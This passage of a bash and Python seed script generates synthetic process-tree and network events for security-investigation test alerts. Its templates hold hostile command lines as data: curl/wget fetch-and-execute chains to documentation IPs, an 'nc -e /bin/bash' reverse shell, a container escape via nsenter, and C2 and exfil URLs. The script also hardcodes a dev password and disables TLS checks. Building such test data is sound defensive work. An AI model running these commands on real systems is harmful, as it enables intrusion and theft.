            {"process_name": "beacon", "command_line": "/tmp/.cache/beacon --interval 30 --jitter 15 --server 203.0.113.45", "executable": "/tmp/.cache/beacon", "code_signature": {"exists": False, "subject_name": None, "trusted": False}}
        ]
    },
    {
        "id": "systemd-cron-sh-curl-hidden", "os": "linux",
        "levels": [
            {"process_name": "systemd", "command_line": "/sbin/init", "executable": "/usr/lib/systemd/systemd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "cron", "command_line": "/usr/sbin/cron -f -P", "executable": "/usr/sbin/cron", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "sh", "command_line": "/bin/sh -c /var/spool/cron/crontabs/root", "executable": "/bin/sh", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "curl", "command_line": "curl -s -o /dev/shm/.hidden http://198.51.100.22/loader.bin", "executable": "/usr/bin/curl", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": ".hidden", "command_line": "/dev/shm/.hidden --daemon --c2 198.51.100.22:8443", "executable": "/dev/shm/.hidden", "code_signature": {"exists": False, "subject_name": None, "trusted": False}}
        ]
    },
    {
        "id": "init-apache2-sh-wget-chmod-exploit", "os": "linux",
        "levels": [
            {"process_name": "init", "command_line": "/sbin/init", "executable": "/sbin/init", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "apache2", "command_line": "/usr/sbin/apache2 -k start", "executable": "/usr/sbin/apache2", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "sh", "command_line": "sh -c \"wget http://203.0.113.88/exploit.elf -O /tmp/exploit && chmod +x /tmp/exploit && /tmp/exploit\"", "executable": "/bin/sh", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "wget", "command_line": "wget http://203.0.113.88/exploit.elf -O /tmp/exploit", "executable": "/usr/bin/wget", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "chmod", "command_line": "chmod +x /tmp/exploit", "executable": "/usr/bin/chmod", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "exploit", "command_line": "/tmp/exploit --escalate --callback 203.0.113.88:9001", "executable": "/tmp/exploit", "code_signature": {"exists": False, "subject_name": None, "trusted": False}}
        ]
    },
    {
        "id": "systemd-dockerd-containerd-bash-nc", "os": "linux",
        "levels": [
            {"process_name": "systemd", "command_line": "/sbin/init", "executable": "/usr/lib/systemd/systemd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "dockerd", "command_line": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock", "executable": "/usr/bin/dockerd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "containerd", "command_line": "/usr/bin/containerd", "executable": "/usr/bin/containerd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "bash", "command_line": "bash -c \"cat /proc/1/environ && nsenter -t 1 -m -u -i -n -p -- /bin/bash\"", "executable": "/usr/bin/bash", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "nc", "command_line": "nc -e /bin/bash 198.51.100.177 4443", "executable": "/usr/bin/nc", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}}
        ]
    }
]

ALL_TEMPLATES = WIN_TEMPLATES + LINUX_TEMPLATES

# ─── Hosts and their OS type (determines which templates to use) ─────────────
# These match the hostnames used by seed-investigation-alerts.sh
WINDOWS_HOSTS = ["FIN-WKS-044", "DC-PROD-01", "HR-LPT-012", "MKT-DSK-019",
                 "DEV-WKS-007", "OPS-NAS-03"]
LINUX_HOSTS = ["ENG-SRV-08", "SEC-MON-02"]

USERNAMES = ["sarah.chen", "james.wilson", "admin-svc-01", "priya.sharma",
             "carlos.mendez", "backup-agent", "svc-monitor", "root"]

# ─── Query OpenSearch for existing INV-* alerts ──────────────────────────────
import urllib.request, ssl

OS_URL = "https://localhost:9200"
OS_USER = "admin"
OS_PASS = "LocalDev@2024!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def os_query(index_pattern, query_body):
    """Query OpenSearch and return hits."""
    import base64
    url = f"{OS_URL}/{index_pattern}/_search"
    data = json.dumps(query_body).encode()
    creds = base64.b64encode(f"{OS_USER}:{OS_PASS}".encode()).decode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Basic {creds}")
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return json.loads(resp.read())
    except Exception as e:
        print(f"# ERROR querying OpenSearch: {e}", file=sys.stderr)
        return {"hits": {"hits": [], "total": {"value": 0}}}

# Fetch all INV-* alerts
alert_query = {
    "query": {"wildcard": {"id.keyword": {"value": "INV-*"}}},
    "size": 100,
    "_source": ["id", "correlationId", "primaryEntityLabel",
                "tenantPrefix", "@timestamp"]
}
result = os_query("v3-hive-alert-*", alert_query)
alerts = [hit["_source"] for hit in result["hits"]["hits"]]

if not alerts:
    print("# WARNING: No INV-* alerts found. Generating from known IDs.",
          file=sys.stderr)
    # Fallback: generate alert stubs from known ID pattern
    tenants = [
        ("cwm", "CWM", 20),
        ("wm1", "WORKMATES1", 15),
        ("wm2", "WORKMATES2", 15)
    ]
    for prefix, label, count in tenants:
        for i in range(1, count + 1):
            alert_id = f"INV-{label}-{i:03d}"
            host = WINDOWS_HOSTS[i % len(WINDOWS_HOSTS)] if i % 5 != 0 \
                else LINUX_HOSTS[i % len(LINUX_HOSTS)]
            alerts.append({
                "id": alert_id,
                "correlationId": f"corr-fallback-{prefix}-{i}",
                "primaryEntityLabel": host,
                "tenantPrefix": prefix,
                "@timestamp": (NOW - timedelta(hours=random.uniform(1, 72))
                              ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
            })

print(f"# Found {len(alerts)} INV-* alerts to generate process trees for",
      file=sys.stderr)

# ─── Process event generation (Tasks 1.4-1.10) ──────────────────────────────

def generate_process_events(alert):
    """Generate 4-12 process events for a single alert.

    Tasks fulfilled:
      1.4 - Generate 4-12 process events per alert
      1.5 - Include all required ECS fields
      1.6 - Include process.code_signature fields
      1.7 - Realistic PID ranges (Windows 1000-65000, Linux 1-32000)
      1.8 - Realistic command lines
      1.9 - Sequential timestamps (parent before child, 1-30s gaps)
      1.10 - Link via alert.id and correlation.id
    """
    alert_id = alert["id"]
    correlation_id = alert.get("correlationId", f"corr-{alert_id}")
    host_name = alert.get("primaryEntityLabel", "FIN-WKS-044")
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_ts_str = alert.get("@timestamp",
                             NOW.strftime("%Y-%m-%dT%H:%M:%S.000Z"))

    # Parse alert timestamp as base for process tree
    try:
        base_time = datetime.strptime(alert_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        base_time = base_time.replace(tzinfo=timezone.utc)
    except ValueError:
        base_time = NOW - timedelta(hours=random.uniform(1, 48))

    # Determine OS type from host name
    is_linux = host_name in LINUX_HOSTS
    templates = LINUX_TEMPLATES if is_linux else WIN_TEMPLATES

    # Select a template (deterministic per alert for reproducibility)
    template_idx = hash(alert_id) % len(templates)
    template = templates[template_idx]
    levels = template["levels"]

    # Decide how many process events: 4-12
    # Use at least len(levels) events, pad with extra child processes
    num_events = max(4, min(12, len(levels) + random.randint(0, 4)))

    # Generate PID chain (Task 1.7)
    if is_linux:
        # Linux: PIDs 1-32000, parent PIDs always lower
        base_pid = random.randint(1, 500)
        pid_chain = [base_pid]
        for _ in range(num_events - 1):
            next_pid = pid_chain[-1] + random.randint(10, 2000)
            if next_pid > 32000:
                next_pid = pid_chain[-1] + random.randint(1, 50)
            pid_chain.append(min(next_pid, 31999))
    else:
        # Windows: PIDs 1000-65000, parent PIDs always lower
        base_pid = random.randint(1000, 3000)
        pid_chain = [base_pid]
        for _ in range(num_events - 1):
            next_pid = pid_chain[-1] + random.randint(100, 5000)
            if next_pid > 65000:
                next_pid = pid_chain[-1] + random.randint(4, 200)
            pid_chain.append(min(next_pid, 64999))

    # Generate sequential timestamps (Task 1.9)
    # Parent starts before child, 1-30 seconds between spawns
    timestamps = []
    current_time = base_time - timedelta(minutes=random.randint(1, 5))
    for _ in range(num_events):
        timestamps.append(current_time)
        gap_seconds = random.randint(1, 30)
        current_time = current_time + timedelta(seconds=gap_seconds)

    # Pick a user
    user = random.choice(USERNAMES)
    if is_linux and random.random() < 0.4:
        user = "root"

    events = []
    for idx in range(num_events):
        # Use template level if available, otherwise generate variation
        if idx < len(levels):
            level = levels[idx]
        else:
            # Extra processes: pick from last few levels with variation
            level = random.choice(levels[-3:])

        pid = pid_chain[idx]
        parent_pid = pid_chain[idx - 1] if idx > 0 else (0 if is_linux else pid - random.randint(100, 500))

        ts = timestamps[idx].strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        event_doc = {
            "@timestamp": ts,
            "event": {
                "action": "process_created",
                "category": ["process"],
                "kind": "event"
            },
            "process": {
                "pid": pid,
                "parent": {"pid": parent_pid},
                "name": level["process_name"],
                "command_line": level["command_line"],
                "executable": level["executable"],
                "code_signature": level["code_signature"]
            },
            "user": {"name": user},
            "host": {
                "name": host_name,
                "os": {"family": "linux" if is_linux else "windows"}
            },
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(event_doc)

    return events

# ─── Generate NDJSON output for all alerts ───────────────────────────────────
total_events = 0
for alert in alerts:
    events = generate_process_events(alert)
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_id = alert["id"]

    for evt_idx, evt in enumerate(events):
        # Determine index date from event timestamp
        evt_ts = evt["@timestamp"]
        try:
            evt_date = datetime.strptime(evt_ts, "%Y-%m-%dT%H:%M:%S.%fZ")
            idx_date = evt_date.strftime("%Y.%m.%d")
        except ValueError:
            idx_date = TODAY_STR

        index_name = f"v3-hive-log-{tenant_prefix}-{idx_date}"
        doc_id = f"proc-{alert_id}-{evt_idx:03d}"

        # Output NDJSON: action line + doc line
        print(json.dumps({"index": {"_index": index_name, "_id": doc_id}}))
        print(json.dumps(evt))
        total_events += 1

print(f"# Total process events generated: {total_events}", file=sys.stderr)
PYEOF

if [ ! -s "$PROC_NDJSON_FILE" ]; then
  fail "Python process event generation produced no output"
  rm -f "$PROC_NDJSON_FILE"
  exit 1
fi
success "Generated process tree events"

# ─── Bulk-insert process events into OpenSearch ──────────────────────────────

info "Indexing process tree events into OpenSearch..."

# Split into chunks of 500 lines (250 docs) for bulk API
split -l 500 "$PROC_NDJSON_FILE" /tmp/ha_proc_chunk_

PROC_CHUNK_COUNT=0
for chunk_file in /tmp/ha_proc_chunk_*; do
  PROC_CHUNK_COUNT=$((PROC_CHUNK_COUNT + 1))
  printf '%s\n' "$(cat "$chunk_file")" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', i.get('create', {})))
        print(f'  Chunk: Indexed {len(items)} process events ({err_count} errors)')
    else:
        print(f'  Chunk: Indexed {len(items)} process events')
except:
    print('  Process event chunk insert completed')
"
  rm -f "$chunk_file"
done
success "Process events indexed (${PROC_CHUNK_COUNT} chunks)"

# Cleanup temp file
rm -f "$PROC_NDJSON_FILE"

echo ""

# ─── Task 1.11: Verify process events per alert ─────────────────────────────

info "Verifying process tree events..."

# Refresh indices so docs are searchable
${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_refresh" 2>/dev/null > /dev/null

# Verify a sample of alerts have 4-12 process events each
VERIFY_ALERTS=("INV-CWM-001" "INV-CWM-005" "INV-WORKMATES1-001" "INV-WORKMATES2-001")
PROC_VERIFY_PASS=0
PROC_VERIFY_FAIL=0

for VERIFY_ID in "${VERIFY_ALERTS[@]}"; do
  PROC_COUNT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_count" \
    -H "${CONTENT_TYPE}" \
    -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"event.category.keyword\":\"process\"}},{\"term\":{\"alert.id.keyword\":\"${VERIFY_ID}\"}}]}}}" 2>/dev/null | \
    python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(r.get('count', 0))
except:
    print('0')
" 2>/dev/null)

  if [ "$PROC_COUNT" -ge 4 ] && [ "$PROC_COUNT" -le 12 ] 2>/dev/null; then
    PROC_VERIFY_PASS=$((PROC_VERIFY_PASS + 1))
  else
    PROC_VERIFY_FAIL=$((PROC_VERIFY_FAIL + 1))
    if [ "$PROC_COUNT" -gt 0 ] 2>/dev/null; then
      warn "  ${VERIFY_ID}: ${PROC_COUNT} process events (expected 4-12)"
    fi
  fi
done

if [ $PROC_VERIFY_FAIL -eq 0 ]; then
  success "Process event verification passed: all ${PROC_VERIFY_PASS} sampled alerts have 4-12 process events"
elif [ $PROC_VERIFY_PASS -gt 0 ]; then
  warn "Process event verification: ${PROC_VERIFY_PASS} passed, ${PROC_VERIFY_FAIL} failed"
else
  warn "Process event verification: no events found (OpenSearch may not be running)"
fi

# Verify process events have required fields (Task 1.5, 1.6)
FIELD_CHECK=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_search" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"bool":{"must":[{"term":{"event.category.keyword":"process"}},{"term":{"alert.id.keyword":"INV-CWM-001"}}]}},"size":1,"_source":["process.pid","process.parent.pid","process.name","process.command_line","process.executable","process.code_signature","user.name","host.name","@timestamp","event.action","alert.id","correlation.id"]}' 2>/dev/null)

FIELDS_OK=$(echo "$FIELD_CHECK" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    hits = r.get('hits', {}).get('hits', [])
    if not hits:
        print('NO_HITS')
    else:
        doc = hits[0]['_source']
        proc = doc.get('process', {})
        required = [
            proc.get('pid') is not None,
            proc.get('parent', {}).get('pid') is not None,
            proc.get('name') is not None,
            proc.get('command_line') is not None,
            proc.get('executable') is not None,
            proc.get('code_signature') is not None,
            doc.get('user', {}).get('name') is not None,
            doc.get('host', {}).get('name') is not None,
            doc.get('@timestamp') is not None,
            doc.get('event', {}).get('action') == 'process_created',
            doc.get('alert', {}).get('id') is not None,
            doc.get('correlation', {}).get('id') is not None
        ]
        if all(required):
            cs = proc.get('code_signature', {})
            if 'exists' in cs and 'trusted' in cs:
                print('ALL_FIELDS_OK')
            else:
                print('MISSING_CODE_SIG')
        else:
            missing = []
            labels = ['pid','parent.pid','name','command_line','executable',
                      'code_signature','user.name','host.name','@timestamp',
                      'event.action','alert.id','correlation.id']
            for i, ok in enumerate(required):
                if not ok:
                    missing.append(labels[i])
            print(f'MISSING: {', '.join(missing)}')
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null)

if [ "$FIELDS_OK" = "ALL_FIELDS_OK" ]; then
  success "Process event field verification passed: all required fields present"
elif echo "$FIELDS_OK" | grep -q "NO_HITS"; then
  warn "Field verification skipped: no process events found for INV-CWM-001"
else
  warn "Process event field check: ${FIELDS_OK}"
fi

echo ""

# ─── Network Activity Event Generation (Tasks 2.1-2.14) ─────────────────────
# Generates 10-30 network events per investigation alert with proper protocol
# distribution: DNS (3-5), HTTPS (4-8), HTTP (2-4), SSH (1-3), SMB (0-2).
# DNS resolved IPs match HTTPS/HTTP destination IPs (cross-reference consistency).
# Sequential timestamps: DNS first, then HTTPS/HTTP, then lateral SSH/SMB.
# Links via alert.id and correlation.id.

info "Generating network activity events for investigation alerts..."

NET_NDJSON_FILE=$(mktemp /tmp/ha_net_events_XXXXXX)

python3 << 'PYEOF' > "$NET_NDJSON_FILE"
import json, random, sys
from datetime import datetime, timedelta, timezone
import urllib.request, ssl, base64

random.seed(2025)  # Reproducible network event seed data

NOW = datetime.now(timezone.utc)
TODAY_STR = NOW.strftime("%Y.%m.%d")

# ─── OpenSearch connection ────────────────────────────────────────────────────
OS_URL = "https://localhost:9200"
OS_USER = "admin"
OS_PASS = "LocalDev@2024!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def os_query(index_pattern, query_body):
    """Query OpenSearch and return hits."""
    url = f"{OS_URL}/{index_pattern}/_search"
    data = json.dumps(query_body).encode()
    creds = base64.b64encode(f"{OS_USER}:{OS_PASS}".encode()).decode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Basic {creds}")
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return json.loads(resp.read())
    except Exception as e:
        print(f"# ERROR querying OpenSearch: {e}", file=sys.stderr)
        return {"hits": {"hits": [], "total": {"value": 0}}}

# ─── Hosts (matching Sprint 39 seed) ─────────────────────────────────────────
WINDOWS_HOSTS = ["FIN-WKS-044", "DC-PROD-01", "HR-LPT-012", "MKT-DSK-019",
                 "DEV-WKS-007", "OPS-NAS-03"]
LINUX_HOSTS = ["ENG-SRV-08", "SEC-MON-02"]

# ─── Network Templates (Task 2.8) ───────────────────────────────────────────
# DNS query names — realistic malicious and benign domains
DNS_DOMAINS_MALICIOUS = [
    "c2.evil.example.com",
    "drop.malware-cdn.example.net",
    "staging.apt-tools.example.com",
    "beacon.cobaltstrike.example.net",
    "exfil.darkweb.example.org",
]
DNS_DOMAINS_BENIGN = [
    "updates.legit-software.example.com",
    "telemetry.monitoring.example.org",
    "cdn.cloud-assets.example.com",
]

# External IPs — RFC5737 ranges for documentation (Task 2.3, 2.4, 2.11)
EXTERNAL_IPS_MALICIOUS = [
    "203.0.113.45",   # C2 server
    "203.0.113.88",   # Known scanner
    "203.0.113.112",  # Exfil relay
    "203.0.113.200",  # Staging server
]
EXTERNAL_IPS_SUSPICIOUS = [
    "198.51.100.22",   # Malware CDN
    "198.51.100.77",   # Beacon endpoint
    "198.51.100.133",  # Suspicious hosting
    "198.51.100.177",  # Exfil endpoint
]

# Internal source IPs — 10.x.x.x ranges (Task 2.2, 2.5, 2.6)
INTERNAL_IPS = [
    "10.1.5.44", "10.1.5.88", "10.1.12.7", "10.2.8.12",
    "10.2.8.55", "10.3.1.100", "10.3.4.22", "10.10.0.15",
]

# Internal lateral targets (for SSH/SMB) — same 10.x range
LATERAL_TARGETS = [
    "10.2.8.12", "10.2.8.55", "10.3.1.100", "10.3.4.22",
    "10.10.0.15", "10.1.12.7", "10.4.2.80", "10.5.1.33",
]

# TLS metadata templates (Task 2.10)
TLS_JA3_HASHES = [
    "a0e9f5d64349fb13191bc781f81f42e1",
    "e7d705a3286e19ea42f587b344ee6865",
    "bd0bf25947d4a37404f0424edf4db9ad",
    "72a589da586844d7f0818ce684948eea",
]
TLS_JA3S_HASHES = [
    "ae4edc6faf64d08308082ad26be60767",
    "f4febc55ea12b31ae17cfb7e614afda8",
    "c02f5937dc99e2a63e35bf6a2c0b5a10",
]
TLS_ISSUERS = [
    "CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US",
    "CN=DigiCert SHA2 Extended Validation Server CA,O=DigiCert Inc,C=US",
    "CN=GlobalSign GCC R3 DV TLS CA 2020,O=GlobalSign nv-sa,C=BE",
]

# Process names associated with network activity
NET_PROCESSES_WINDOWS = [
    ("powershell.exe", 4812), ("svchost.exe", 1088), ("chrome.exe", 7420),
    ("rundll32.exe", 5100), ("cmd.exe", 2048), ("beacon.exe", 6344),
]
NET_PROCESSES_LINUX = [
    ("python3", 1455), ("curl", 1890), ("wget", 2011),
    ("beacon", 1678), ("nc", 2200), (".hidden", 1933),
]

# IP reputation templates (Task 2.11)
REPUTATION_CATEGORIES = ["command-and-control", "malware-distribution", "scanner"]
REPUTATION_SOURCES = ["AbuseIPDB", "VirusTotal"]

# HTTP URL templates (Task 2.4)
HTTP_URLS = [
    "http://198.51.100.22/payload.exe",
    "http://198.51.100.22/stager.ps1",
    "http://198.51.100.77/beacon/config",
    "http://198.51.100.133/update.bin",
    "http://198.51.100.22/loader.bin",
    "http://198.51.100.177/exfil/data",
]

# Domain-to-IP mapping (Task 2.9) — ensures DNS resolved IPs match dest IPs
DOMAIN_IP_MAP = {
    "c2.evil.example.com": "203.0.113.45",
    "drop.malware-cdn.example.net": "198.51.100.22",
    "staging.apt-tools.example.com": "203.0.113.200",
    "beacon.cobaltstrike.example.net": "203.0.113.112",
    "exfil.darkweb.example.org": "198.51.100.177",
    "updates.legit-software.example.com": "203.0.113.88",
    "telemetry.monitoring.example.org": "198.51.100.133",
    "cdn.cloud-assets.example.com": "198.51.100.77",
}

# ─── Fetch INV-* alerts from OpenSearch ───────────────────────────────────────
alert_query = {
    "query": {"wildcard": {"id.keyword": {"value": "INV-*"}}},
    "size": 100,
    "_source": ["id", "correlationId", "primaryEntityLabel",
                "tenantPrefix", "@timestamp"]
}
result = os_query("v3-hive-alert-*", alert_query)
alerts = [hit["_source"] for hit in result["hits"]["hits"]]

if not alerts:
    print("# WARNING: No INV-* alerts found. Generating from known IDs.",
          file=sys.stderr)
    tenants = [
        ("cwm", "CWM", 20),
        ("wm1", "WORKMATES1", 15),
        ("wm2", "WORKMATES2", 15)
    ]
    for prefix, label, count in tenants:
        for i in range(1, count + 1):
            alert_id = f"INV-{label}-{i:03d}"
            host = WINDOWS_HOSTS[i % len(WINDOWS_HOSTS)] if i % 5 != 0 \
                else LINUX_HOSTS[i % len(LINUX_HOSTS)]
            alerts.append({
                "id": alert_id,
                "correlationId": f"corr-fallback-{prefix}-{i}",
                "primaryEntityLabel": host,
                "tenantPrefix": prefix,
                "@timestamp": (NOW - timedelta(hours=random.uniform(1, 72))
                              ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
            })

print(f"# Found {len(alerts)} INV-* alerts to generate network events for",
      file=sys.stderr)

# ─── Network event generation (Tasks 2.1-2.13) ──────────────────────────────

def is_internal_ip(ip):
    """Check if IP is in internal RFC1918 ranges."""
    return (ip.startswith("10.") or ip.startswith("172.16.") or
            ip.startswith("172.17.") or ip.startswith("172.18.") or
            ip.startswith("172.19.") or ip.startswith("172.2") or
            ip.startswith("172.30.") or ip.startswith("172.31.") or
            ip.startswith("192.168."))

def classify_direction(src_ip, dst_ip):
    """Classify network direction: outbound, inbound, or lateral (Task 2.7)."""
    src_internal = is_internal_ip(src_ip)
    dst_internal = is_internal_ip(dst_ip)
    if src_internal and not dst_internal:
        return "outbound"
    elif not src_internal and dst_internal:
        return "inbound"
    else:
        return "lateral"

def get_reputation(ip):
    """Generate threat.indicator.ip_reputation for external IPs (Task 2.11)."""
    if is_internal_ip(ip):
        return None
    if ip in EXTERNAL_IPS_MALICIOUS:
        return {
            "score": random.randint(80, 99),
            "category": "command-and-control",
            "source": random.choice(REPUTATION_SOURCES)
        }
    elif ip in EXTERNAL_IPS_SUSPICIOUS:
        return {
            "score": random.randint(50, 79),
            "category": random.choice(["malware-distribution", "scanner"]),
            "source": random.choice(REPUTATION_SOURCES)
        }
    return {
        "score": random.randint(50, 65),
        "category": random.choice(REPUTATION_CATEGORIES),
        "source": random.choice(REPUTATION_SOURCES)
    }

def generate_network_events(alert):
    """Generate 10-30 network events for a single alert.

    Distribution (Tasks 2.2-2.6):
      - DNS events: 3-5 per alert
      - HTTPS connections: 4-8 per alert
      - HTTP connections: 2-4 per alert
      - SSH lateral: 1-3 per alert
      - SMB lateral: 0-2 per alert

    All events include (Task 2.7):
      source.ip, source.port (ephemeral 49152-65535), destination.ip,
      destination.port, network.bytes, network.direction,
      network.transport ("tcp"|"udp"), process.name, process.pid,
      host.name, @timestamp

    Timestamps sequential (Task 2.12):
      DNS first → HTTPS/HTTP → SSH/SMB lateral
    """
    alert_id = alert["id"]
    correlation_id = alert.get("correlationId", f"corr-{alert_id}")
    host_name = alert.get("primaryEntityLabel", "FIN-WKS-044")
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_ts_str = alert.get("@timestamp",
                             NOW.strftime("%Y-%m-%dT%H:%M:%S.000Z"))

    # Parse alert timestamp as base
    try:
        base_time = datetime.strptime(alert_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        base_time = base_time.replace(tzinfo=timezone.utc)
    except ValueError:
        base_time = NOW - timedelta(hours=random.uniform(1, 48))

    # Determine OS type
    is_linux = host_name in LINUX_HOSTS
    processes = NET_PROCESSES_LINUX if is_linux else NET_PROCESSES_WINDOWS

    # Pick a stable source IP for this host
    src_ip = INTERNAL_IPS[hash(host_name) % len(INTERNAL_IPS)]

    # Determine event counts per protocol type
    dns_count = random.randint(3, 5)
    https_count = random.randint(4, 8)
    http_count = random.randint(2, 4)
    ssh_count = random.randint(1, 3)
    smb_count = random.randint(0, 2)

    events = []
    current_time = base_time - timedelta(minutes=random.randint(2, 10))

    # ─── Phase 1: DNS events (happen first) (Task 2.2, 2.8, 2.9) ────────
    # Select domains for this alert — mix of malicious and benign
    selected_domains = random.sample(DNS_DOMAINS_MALICIOUS,
                                     min(dns_count - 1, len(DNS_DOMAINS_MALICIOUS)))
    selected_domains.append(random.choice(DNS_DOMAINS_BENIGN))
    random.shuffle(selected_domains)
    selected_domains = selected_domains[:dns_count]

    # Track resolved IPs for cross-reference with HTTPS/HTTP (Task 2.9)
    resolved_ips_map = {}  # domain -> resolved IP

    for domain in selected_domains:
        resolved_ip = DOMAIN_IP_MAP.get(domain, random.choice(EXTERNAL_IPS_SUSPICIOUS))
        resolved_ips_map[domain] = resolved_ip

        current_time += timedelta(seconds=random.uniform(0.5, 3.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        proc_name, proc_pid = random.choice(processes)
        ephemeral_port = random.randint(49152, 65535)

        dns_event = {
            "@timestamp": ts,
            "event": {
                "action": "dns_query",
                "category": ["network"],
                "kind": "event",
                "type": ["connection", "protocol"]
            },
            "source": {"ip": src_ip, "port": ephemeral_port},
            "destination": {"ip": "10.1.5.1", "port": 53},
            "network": {
                "bytes": random.randint(64, 256),
                "direction": "outbound",
                "transport": "udp",
                "protocol": "dns"
            },
            "dns": {
                "question": {"name": domain, "type": "A"},
                "resolved_ip": [resolved_ip]
            },
            "process": {"name": proc_name, "pid": proc_pid},
            "host": {"name": host_name,
                     "os": {"family": "linux" if is_linux else "windows"}},
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(dns_event)

    # ─── Phase 2: HTTPS connections (Task 2.3, 2.10) ──────────────────────
    # Use IPs resolved from DNS queries (Task 2.9)
    https_dest_ips = list(resolved_ips_map.values())
    while len(https_dest_ips) < https_count:
        https_dest_ips.append(random.choice(EXTERNAL_IPS_MALICIOUS))

    for i in range(https_count):
        current_time += timedelta(seconds=random.uniform(1.0, 8.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        dest_ip = https_dest_ips[i % len(https_dest_ips)]
        proc_name, proc_pid = random.choice(processes)
        ephemeral_port = random.randint(49152, 65535)

        # Find the domain that resolves to this IP for TLS server_name
        server_name = None
        for dom, ip in resolved_ips_map.items():
            if ip == dest_ip:
                server_name = dom
                break
        if not server_name:
            server_name = random.choice(DNS_DOMAINS_MALICIOUS)

        # TLS metadata (Task 2.10)
        not_after = (NOW + timedelta(days=random.randint(30, 365))
                    ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        https_event = {
            "@timestamp": ts,
            "event": {
                "action": "connection_established",
                "category": ["network"],
                "kind": "event",
                "type": ["connection", "protocol"]
            },
            "source": {"ip": src_ip, "port": ephemeral_port},
            "destination": {"ip": dest_ip, "port": 443},
            "network": {
                "bytes": random.randint(2048, 50000),
                "direction": classify_direction(src_ip, dest_ip),
                "transport": "tcp",
                "protocol": "tls"
            },
            "tls": {
                "client": {"ja3": random.choice(TLS_JA3_HASHES)},
                "server": {
                    "ja3s": random.choice(TLS_JA3S_HASHES),
                    "issuer": random.choice(TLS_ISSUERS),
                    "subject": f"CN={server_name}",
                    "not_after": not_after
                },
                "version": "TLSv1.3",
                "server_name": server_name
            },
            "process": {"name": proc_name, "pid": proc_pid},
            "host": {"name": host_name,
                     "os": {"family": "linux" if is_linux else "windows"}},
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }

        # Add reputation for external IPs (Task 2.11)
        rep = get_reputation(dest_ip)
        if rep:
            https_event["threat"] = {"indicator": {"ip_reputation": rep}}

        events.append(https_event)

    # ─── Phase 2b: HTTP connections (Task 2.4) ────────────────────────────
    http_dest_ips = [ip for ip in resolved_ips_map.values()
                     if ip in EXTERNAL_IPS_SUSPICIOUS]
    if not http_dest_ips:
        http_dest_ips = EXTERNAL_IPS_SUSPICIOUS[:3]

    for i in range(http_count):
        current_time += timedelta(seconds=random.uniform(2.0, 12.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        dest_ip = http_dest_ips[i % len(http_dest_ips)]
        proc_name, proc_pid = random.choice(processes)
        ephemeral_port = random.randint(49152, 65535)

        # Pick a URL that matches the dest IP
        matching_urls = [u for u in HTTP_URLS if dest_ip in u]
        url = matching_urls[0] if matching_urls else \
              f"http://{dest_ip}/beacon/{random.randint(1000,9999)}"

        http_event = {
            "@timestamp": ts,
            "event": {
                "action": "http_request",
                "category": ["network"],
                "kind": "event",
                "type": ["connection", "protocol"]
            },
            "source": {"ip": src_ip, "port": ephemeral_port},
            "destination": {"ip": dest_ip, "port": 80},
            "network": {
                "bytes": random.randint(1024, 25000),
                "direction": classify_direction(src_ip, dest_ip),
                "transport": "tcp",
